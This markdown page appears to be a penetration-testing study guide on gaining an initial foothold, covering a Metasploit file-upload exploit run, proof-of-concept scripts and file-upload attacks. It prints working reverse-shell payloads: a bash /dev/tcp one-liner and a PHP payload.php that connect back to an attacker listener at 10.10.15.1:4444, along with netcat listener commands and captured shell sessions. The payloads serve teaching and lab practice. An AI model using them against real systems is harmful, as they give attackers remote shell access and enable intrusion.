# Foothold

 - [Metasploit](Foothold.md#metasploit)
 - [Proof of Concept Scripts](Foothold.md#proof-of-concept-scripts)
 - [File Upload](Foothold.md#file-upload)
 
## Metasploit
Since getting the service versions was a part of the reconnaissance phase, it should be taken advantage of.  
Google the version of any services you find and see if there are any vulnerabilities.  
If you're lucky, there's a Metasploit module that you can use.  

There's a nice [SANS cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf) to help use Metasploit though.  
Here's an example run of an example exploit to put the cheatsheet into perpsective.
```console
msf5 > search example

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/example_file_upload     2015-09-15       excellent  Yes    Examlple File Upload Vulnerability

msf5 > use 0
msf5 exploit(multi/http/example_file_upload) > options

Module options (exploit/multi/http/example_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   VHOST                       no        HTTP server virtual host

Exploit target:

   Id  Name
   --  ----
   0   Example 3.1.1

msf5 exploit(multi/http/example_file_upload) > set RHOSTS 10.10.10.10
RHOSTS => 10.10.10.10
msf5 exploit(multi/http/example_file_upload) > set TARGETURI /example/
TARGETURI => /example/
msf5 exploit(multi/http/example_file_upload) > run
[*] Started reverse TCP handler on 10.10.15.1:4444
[*] Sending stage (37543 bytes) to 10.10.10.10
[*] Meterpreter session 1 opened (10.10.15.1:4444 -> 10.10.10.10:56052) at 2020-07-11 20:51:40 -0500
[+] Deleted payload.php
meterpreter > shell
Process 3816 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Proof of Concept Scripts
If you find a vulnerability on a service, but there isn't a Metasploit module available,  
you might be able to find a proof of concept (PoC) script on Github or Exploit-DB.  
More often than not, a PoC script will only give you the ability to send commands to run, which can be slow and cumbersome to use.  
The solution to this is setting up a reverse shell.

Utilizing a reverse shell is a three step process

 1. Setting up a netcat listener on your local machine
    ```
    Command Breakdown:
        nc: TCP/IP swiss army knife, used to read and write data across network connections
        -n: No DNS
        -v: Verbose
        -l: Listen for inbound connections
        -p 4444: Local port to open for connections
    ```

    ```console
    user@parrot:~$ nc -nvlp 4444
    listening on [any] 4444 ...
    ```
     
 2. Executing a reverse shell on the target machine by using a PoC script.  
    This step can use any number of programming languages and commands.  
    Luckily, there's a Github repository called [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)  
    that offers a cheat sheet for such a thing. (Among many other great materials)
    ```console
    user@parrot:~$ python3 50180 http://10.10.10.10/example -c "bash -i >& /dev/tcp/10.10.15.1/4444 0>&1"  
    Example 2.3 - Remote Command Execution
    
    [+] Uploading malicious .zip file: ✓
    [+] Executing bash -i >& /dev/tcp/10.10.15.1/4444 0>&1: ✓
    [+] Keep breaking ev3rYthiNg!!
    ```
    
 3. Return to the listener and start enumerating for a better user.
    ```console
    user@parrot:~$ nc -nvlp 4444
    listening on [any] 4444 ...
    connect to [10.10.10.10] from (UNKNOWN) [10.10.15.1] 33280
    www-data@example:/var/www/html$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

## File Upload
If there isn't a common vulnerability to exploit, then you might want to look for a place to upload files.  
If you do find a place to upload files, then you should try uploading a PHP reverse shell.

payload.php:
```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.15.1/4444 0>&1'");
?>
```

Once you've uploaded the reverse shell, then you can create a netcat listener and trigger the playload.

 1. Setting up a netcat listener on your local machine
    ```console
    user@parrot:~$ nc -nvlp 4444
    listening on [any] 4444 ...
    ```
     
 2. With your file uploaded, you should find out where it's stored on the website and `curl` it to trigger the reverse shell.
    ```console
    user@parrot:~$ curl http://10.10.10.10/upload/payload.php
    ```
    
 3. Return to the listener and start enumerating for a better user.
    ```console
    user@parrot:~$ nc -nvlp 4444
    listening on [any] 4444 ...
    connect to [10.10.10.10] from (UNKNOWN) [10.10.15.1] 45812
    www-data@example:/var/www/html$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
